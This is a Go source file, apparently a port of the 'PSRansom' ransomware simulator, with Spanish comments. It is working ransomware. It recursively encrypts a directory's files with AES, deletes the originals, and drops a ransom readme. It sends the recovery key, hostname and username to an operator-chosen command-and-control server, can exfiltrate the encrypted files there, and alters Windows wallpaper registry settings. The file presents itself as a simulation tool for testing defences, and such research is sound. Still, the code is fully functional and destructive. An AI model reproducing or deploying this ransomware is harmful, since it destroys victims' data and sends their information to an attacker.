package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

// Configuración global
var (
	OSVersion       = runtime.GOOS
	ComputerName    = getEnv("COMPUTERNAME", "unknown")
	UserName        = getEnv("USERNAME", "unknown")
	UserDomain      = getEnv("USERDOMAIN", "unknown")
	CurrentTime     = time.Now().Format("15:04 - 02/01/06")
	TMKey           = generateTMKey()
	DirectoryTarget string
	Slash           = string(filepath.Separator)
	Domain          = ""
)

// Colores ANSI
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorCyan   = "\033[36m"
	ColorWhite  = "\033[37m"
)

func init() {
	if OSVersion == "windows" {
		Domain = UserDomain + "\\"
	}
}

// Banner con colores
func showBanner() {
	fmt.Println()
	fmt.Println(ColorBlue + "  ____  ____  ____                                  " + ColorReset)
	fmt.Println(ColorBlue + " |  _ \\/ ___||  _ \\ __ _ _ __  ___  ___  _ __ ___   " + ColorReset)
	fmt.Println(ColorBlue + " | |_) \\___ \\| |_) / _' | '_ \\/ __|/ _ \\| '_ ' _ \\  " + ColorReset)
	fmt.Println(ColorBlue + " |  __/ ___) |  _ < (_| | | | \\__ \\ (_) | | | | | | " + ColorReset)
	fmt.Println(ColorBlue + " |_|   |____/|_| \\_\\__,_|_| |_|___/\\___/|_| |_| |_| " + ColorReset)
	fmt.Println()
	fmt.Println(ColorGreen + "  ----------------- by @JoelGMSec ----------------  " + ColorReset)
}

// Ayuda con colores
func showHelp() {
	fmt.Println()
	fmt.Print(ColorYellow + " Info: " + ColorReset)
	fmt.Println(" This tool helps you simulate encryption process of a")
	fmt.Println("        generic ransomware in PowerShell with C2 capabilities")
	fmt.Println()
	fmt.Print(ColorYellow + " Usage: " + ColorReset)
	fmt.Println(ColorBlue + "PSRansom.exe -e Directory -s C2Server -p C2Port" + ColorReset)
	fmt.Println(ColorGreen + "        Encrypt all files & sends recovery key to C2Server" + ColorReset)
	fmt.Println(ColorGreen + "        Use -x to exfiltrate and decrypt files on C2Server" + ColorReset)
	fmt.Println()
	fmt.Println(ColorBlue + "        PSRansom.exe -d Directory -k RecoveryKey" + ColorReset)
	fmt.Println(ColorGreen + "        Decrypt all files with recovery key string" + ColorReset)
	fmt.Println()
	fmt.Print(ColorRed + " Warning: " + ColorReset)
	fmt.Println("All info will be sent to the C2Server without any encryption")
	fmt.Print("         ")
	fmt.Println(" You need previously generated recovery key to retrieve files")
	fmt.Println()
}

// Funciones auxiliares
func getEnv(key, fallback string) string {
	if value, exists := os.LookupEnv(key); exists {
		return strings.ToLower(value)
	}
	return fallback
}

func generateTMKey() string {
	timeKey := strings.NewReplacer(":", "", " ", "", "-", "", "/", "").Replace(CurrentTime)
	return timeKey + ComputerName
}

func generateRandomKey() string {
	const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	bytes := make([]byte, 24)
	rand.Read(bytes)
	for i, b := range bytes {
		bytes[i] = chars[b%byte(len(chars))]
	}
	return string(bytes)
}

// Codificación R64 (Base64 personalizado)
func R64Encode(mode string, data interface{}) string {
	var base64Str string

	switch v := data.(type) {
	case string:
		if mode == "-t" {
			base64Str = base64.StdEncoding.EncodeToString([]byte(v))
		}
	case []byte:
		if mode == "-f" {
			base64Str = base64.StdEncoding.EncodeToString(v)
		}
	}

	// Remover padding
	base64Str = strings.TrimRight(base64Str, "=")
	// Reemplazar caracteres
	base64Str = strings.ReplaceAll(base64Str, "+", "-")
	base64Str = strings.ReplaceAll(base64Str, "/", "_")

	// Revertir string
	runes := []rune(base64Str)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}

	return string(runes)
}

// Cifrado AES
type AESEncryption struct {
	key []byte
}

func NewAESEncryption(key string) *AESEncryption {
	hash := sha256.Sum256([]byte(key))
	return &AESEncryption{key: hash[:]}
}

func (a *AESEncryption) Encrypt(plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(a.key)
	if err != nil {
		return nil, err
	}

	// IV aleatorio
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		return nil, err
	}

	// Modo CBC
	mode := cipher.NewCBCEncrypter(block, iv)

	// PKCS7 padding
	plaintext = pkcs7Pad(plaintext, aes.BlockSize)

	ciphertext := make([]byte, len(plaintext))
	mode.CryptBlocks(ciphertext, plaintext)

	// Prepend IV
	return append(iv, ciphertext...), nil
}

func (a *AESEncryption) Decrypt(ciphertext []byte) ([]byte, error) {
	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	block, err := aes.NewCipher(a.key)
	if err != nil {
		return nil, err
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// PKCS7 unpadding
	return pkcs7Unpad(plaintext)
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

func pkcs7Unpad(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	padding := int(data[len(data)-1])
	if padding > len(data) {
		return nil, fmt.Errorf("invalid padding")
	}
	return data[:len(data)-padding], nil
}

// Funciones de sistema
func removeWallpaper() {
	if OSVersion != "windows" {
		return
	}

	// Eliminar wallpaper
	key, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.SET_VALUE)
	if err == nil {
		key.SetStringValue("WallPaper", "")
		key.Close()
	}

	// Establecer fondo rojo
	colorsKey, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Colors`, registry.SET_VALUE)
	if err == nil {
		colorsKey.SetStringValue("Background", "250 25 50")
		colorsKey.Close()
	}
}

func showInfo() {
	fmt.Println()
	fmt.Print(ColorYellow + "[>] Hostname: " + ColorReset)
	fmt.Println(ComputerName)
	fmt.Print(ColorYellow + "[>] Current User: " + ColorReset)
	fmt.Println(Domain + UserName)
	fmt.Print(ColorYellow + "[>] Current Time: " + ColorReset)
	fmt.Println(CurrentTime)
}

// Funciones C2
func getStatus(server, port string) bool {
	url := fmt.Sprintf("http://%s:%s/status", server, port)
	resp, err := http.Get(url)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

func sendResults(server, port, psrKey string, directory string) {
	// 1. Cifrar la clave igual que en PowerShell
	aes := NewAESEncryption(TMKey)
	encryptedKey, err := aes.Encrypt([]byte(psrKey))
	if err != nil {
		fmt.Println("Error cifrando clave:", err)
		return
	}

	// 2. Convertir a Base64 (esto replica lo que hace PowerShell con [System.Convert]::ToBase64String)
	standardB64 := base64.StdEncoding.EncodeToString(encryptedKey)

	// 3. Aplicar R64Encoder igual que en PowerShell
	b64Key := R64Encode("-t", standardB64)

	c2Data := fmt.Sprintf(" [>] Key: %s [>] Hostname: %s [>] Current User: %s%s [>] Current Time: %s",
		b64Key, ComputerName, Domain, UserName, CurrentTime)
	b64Data := R64Encode("-t", c2Data)

	// Enviar datos principales
	url := fmt.Sprintf("http://%s:%s/data", server, port)
	http.Post(url, "text/plain", strings.NewReader(b64Data))

	// Enviar logs de archivos cifrados
	sendLogs(server, port, directory)
}

func sendLogs(server, port, directory string) {
	readmePath := filepath.Join(directory, "readme.txt")
	if _, err := os.Stat(readmePath); err == nil {
		content, err := os.ReadFile(readmePath)
		if err != nil {
			return
		}

		// Filtrar solo las líneas que contienen "[!]" pero no "PSRansom!"
		lines := strings.Split(strings.ReplaceAll(string(content), "\r\n", ""), "\n")
		var logLines []string
		for _, line := range lines {
			// Limpiar espacios y saltos de línea
			line = strings.TrimSpace(line)
			if line != "" && strings.Contains(line, "[!]") && !strings.Contains(line, "PSRansom!") {
				logLines = append(logLines, line)
			}
		}

		if len(logLines) > 0 {
			logs := strings.Join(logLines, "")
			b64Logs := R64Encode("-t", logs)
			url := fmt.Sprintf("http://%s:%s/logs", server, port)
			http.Post(url, "text/plain", strings.NewReader(b64Logs))
		}
	}
}

func sendClose(server, port string) {
	url := fmt.Sprintf("http://%s:%s/close", server, port)
	http.Get(url)
}

func sendPay(server, port string) {
	url := fmt.Sprintf("http://%s:%s/pay", server, port)
	http.Get(url)
}

func sendOK(server, port string) {
	url := fmt.Sprintf("http://%s:%s/done", server, port)
	http.Get(url)
}

// Funciones de archivos
func createReadme(directory, psrKey string) {
	readmePath := filepath.Join(directory, "readme.txt")
	if _, err := os.Stat(readmePath); os.IsNotExist(err) {
		content := fmt.Sprintf("All your files have been encrypted by PSRansom!\nBut don't worry, you can still recover them with the recovery key :)\n\nRecovery Key: %s\n\n", psrKey)
		os.WriteFile(readmePath, []byte(content), 0644)
	}
}

func encryptFiles(directory, psrKey string) {
	excludedPatterns := []string{"*.psr", "readme.txt", "*.dll", "*.ini", "*.sys", "*.exe", "*.msi", "*.NLS", "*.acm", "*.nls", "*.EXE", "*.dat", "*.efi", "*.mui"}
	aes := NewAESEncryption(psrKey)
	readmePath := filepath.Join(directory, "readme.txt")

	filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		// Verificar exclusiones
		shouldExclude := false
		for _, pattern := range excludedPatterns {
			matched, _ := filepath.Match(pattern, info.Name())
			if matched {
				shouldExclude = true
				break
			}
		}

		if shouldExclude {
			return nil
		}

		// Leer y cifrar archivo
		content, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		encrypted, err := aes.Encrypt(content)
		if err != nil {
			return nil
		}

		// Guardar archivo cifrado
		encryptedPath := path + ".psr"
		os.WriteFile(encryptedPath, encrypted, 0644)

		// Preservar timestamp
		os.Chtimes(encryptedPath, info.ModTime(), info.ModTime())

		// Eliminar original
		os.Remove(path)

		// Registrar en readme
		entry := fmt.Sprintf("[!] %s is now encrypted\n", path)
		f, _ := os.OpenFile(readmePath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		f.WriteString(entry)
		f.Close()

		return nil
	})
}

func exfiltrateFiles(directory, server, port string) {
	// Notificar al C2 que empezará la exfiltración
	url := fmt.Sprintf("http://%s:%s/files", server, port)
	http.Get(url)

	// Verificar si hay archivos cifrados
	hasEncryptedFiles := false
	filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if strings.HasSuffix(path, ".psr") {
			hasEncryptedFiles = true
			return filepath.SkipAll
		}
		return nil
	})

	if !hasEncryptedFiles {
		b64Name := R64Encode("-t", "none.null")
		url := fmt.Sprintf("http://%s:%s/files/%s", server, port, b64Name)
		http.Post(url, "text/plain", strings.NewReader(""))
		return
	}

	// Exfiltrar archivos
	filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		if strings.HasSuffix(path, ".psr") {
			content, err := os.ReadFile(path)
			if err != nil {
				return nil
			}

			fileName := filepath.Base(path)
			b64File := R64Encode("-f", content)
			b64Name := R64Encode("-t", fileName)

			url := fmt.Sprintf("http://%s:%s/files/%s", server, port, b64Name)
			resp, err := http.Post(url, "text/plain", strings.NewReader(b64File))
			if err == nil {
				defer resp.Body.Close()
			}
		}
		return nil
	})
}

func decryptFiles(directory, psrKey string) {
	aes := NewAESEncryption(psrKey)

	filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		if strings.HasSuffix(path, ".psr") {
			content, err := os.ReadFile(path)
			if err != nil {
				return nil
			}

			decrypted, err := aes.Decrypt(content)
			if err != nil {
				return nil
			}

			// Guardar archivo descifrado
			decryptedPath := strings.TrimSuffix(path, ".psr")
			os.WriteFile(decryptedPath, decrypted, 0644)

			// Preservar timestamp
			os.Chtimes(decryptedPath, info.ModTime(), info.ModTime())

			fmt.Printf(ColorBlue+"[+] %s is now decrypted\n"+ColorReset, decryptedPath)
		}
		return nil
	})

	// Eliminar archivo readme.txt después de descifrar
	readmePath := filepath.Join(directory, "readme.txt")
	if _, err := os.Stat(readmePath); err == nil {
		os.Remove(readmePath)
	}
}

func checkFiles(directory string) {
	hasEncryptedFiles := false
	filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if strings.HasSuffix(path, ".psr") {
			hasEncryptedFiles = true
			os.Remove(path)
		}
		return nil
	})

	if !hasEncryptedFiles {
		fmt.Println(ColorRed + "[!] No encrypted files has been found!" + ColorReset)
	}
}

// Función para parsear argumentos manualmente (para mantener compatibilidad con PowerShell)
func parseArgs() (string, string, string, string, string, bool, bool, bool) {
	var mode, directory, psrKey, c2Server, c2Port string
	var exfil, demo, help bool

	args := os.Args[1:]

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-e", "-d":
			mode = args[i]
			if i+1 < len(args) {
				directory = args[i+1]
				i++
			}
		case "-s":
			if i+1 < len(args) {
				c2Server = args[i+1]
				i++
			}
		case "-p":
			if i+1 < len(args) {
				c2Port = args[i+1]
				i++
			}
		case "-k":
			if i+1 < len(args) {
				psrKey = args[i+1]
				i++
			}
		case "-x":
			exfil = true
		case "-demo":
			demo = true
		case "-h", "-help", "--help":
			help = true
		}
	}

	return mode, directory, psrKey, c2Server, c2Port, exfil, demo, help
}

func main() {
	// Parsear argumentos manualmente
	mode, directory, psrKey, c2Server, c2Port, exfil, demo, help := parseArgs()

	if help || len(os.Args) == 1 {
		showBanner()
		showHelp()
		return
	}

	// Validaciones (igual que en PowerShell)
	if mode == "" || directory == "" {
		showBanner()
		showHelp()
		fmt.Println(ColorRed + "[!] Not enough parameters!" + ColorReset)
		fmt.Println()
		return
	}

	if mode == "-e" && (c2Server == "" || c2Port == "") {
		showBanner()
		showHelp()
		fmt.Println(ColorRed + "[!] Not enough parameters!" + ColorReset)
		fmt.Println()
		return
	}

	if mode == "-d" && psrKey == "" {
		showBanner()
		showHelp()
		fmt.Println(ColorRed + "[!] Not enough parameters!" + ColorReset)
		fmt.Println()
		return
	}

	// Configurar DirectoryTarget
	DirectoryTarget = filepath.Base(directory)
	if DirectoryTarget == "" || DirectoryTarget == "." {
		absPath, _ := filepath.Abs(directory)
		DirectoryTarget = filepath.Base(absPath)
	}

	showBanner()
	showInfo()

	if mode == "-d" {
		fmt.Println()
		fmt.Println(ColorRed + "[!] Recovering ransomware infection on " + DirectoryTarget + " directory.." + ColorReset)
		fmt.Println(ColorGreen + "[i] Applying recovery key on encrypted files.." + ColorReset)
		decryptFiles(directory, psrKey)
		checkFiles(directory)
		time.Sleep(1 * time.Second)
	} else {
		fmt.Println()
		fmt.Println(ColorRed + "[!] Simulating ransomware infection on " + DirectoryTarget + " directory.." + ColorReset)
		fmt.Println(ColorBlue + "[+] Checking communication with Command & Control Server.." + ColorReset)
		c2Status := getStatus(c2Server, c2Port)
		if c2Status {
			fmt.Println(ColorGreen + "[i] Command & Control Server is up!" + ColorReset)
		} else {
			fmt.Println(ColorRed + "[!] Command & Control Server is down!" + ColorReset)
		}
		time.Sleep(1 * time.Second)

		fmt.Println(ColorBlue + "[+] Generating new random string key for encryption.." + ColorReset)
		generatedKey := generateRandomKey()
		psrKey = generatedKey // Guardar para uso posterior

		fmt.Println(ColorRed + "[!] Encrypting all files with 256 bits AES key.." + ColorReset)
		createReadme(directory, generatedKey)
		encryptFiles(directory, generatedKey)

		if c2Status {
			sendResults(c2Server, c2Port, generatedKey, directory)
			time.Sleep(1 * time.Second)

			if exfil {
				fmt.Println(ColorGreen + "[i] Exfiltrating files to Command & Control Server.." + ColorReset)
				exfiltrateFiles(directory, c2Server, c2Port)
				time.Sleep(1 * time.Second)
			}
		} else {
			fmt.Println(ColorBlue + "[+] Saving logs and key in readme.txt.." + ColorReset)
		}

		if c2Status {
			fmt.Println(ColorBlue + "[+] Sending logs and key to Command & Control Server.." + ColorReset)
		}

		if demo {
			removeWallpaper()
			// Nota: La funcionalidad GUI (PopUpRansom) requeriría librerías adicionales
			fmt.Println("[!] Demo mode activated (GUI popup simulation)")
		}

		if c2Status {
			sendOK(c2Server, c2Port)
		}
	}

	time.Sleep(1 * time.Second)
	fmt.Println(ColorGreen + "[i] Done!" + ColorReset)
	fmt.Println()
}
